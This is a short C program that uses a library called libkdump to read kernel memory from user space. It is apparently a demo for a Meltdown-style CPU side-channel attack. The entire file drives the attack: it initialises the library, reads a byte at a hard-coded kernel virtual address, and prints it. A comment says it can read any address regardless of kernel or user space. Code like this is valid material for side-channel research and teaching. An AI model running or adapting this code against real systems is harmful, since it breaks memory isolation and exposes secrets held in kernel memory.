#include "libkdump.h"

int main() {

	libkdump_config_t config = config;
	config = libkdump_get_autoconfig();
	// edit config
	//config.physical_offset = 0xffff8e7100000000ull;

	// initialize libkdump
	if(libkdump_init(config) != 0) {
		perror("Failed to initialize libkdump\n");
		return -1;	
	}

	/*
		Reading kernel memory
	*/

	// read any virtual address, regardless of kernel/user space
	size_t addr = 0xffff88008cca3070;
	int val = libkdump_read(addr);
	printf("Read value: %c\n", val);

	// cleanup libkdump
	if(libkdump_cleanup() != 0) {
		perror("Failed to cleanup libkdump\n");
		return -1;
	}	

	return 0;
}
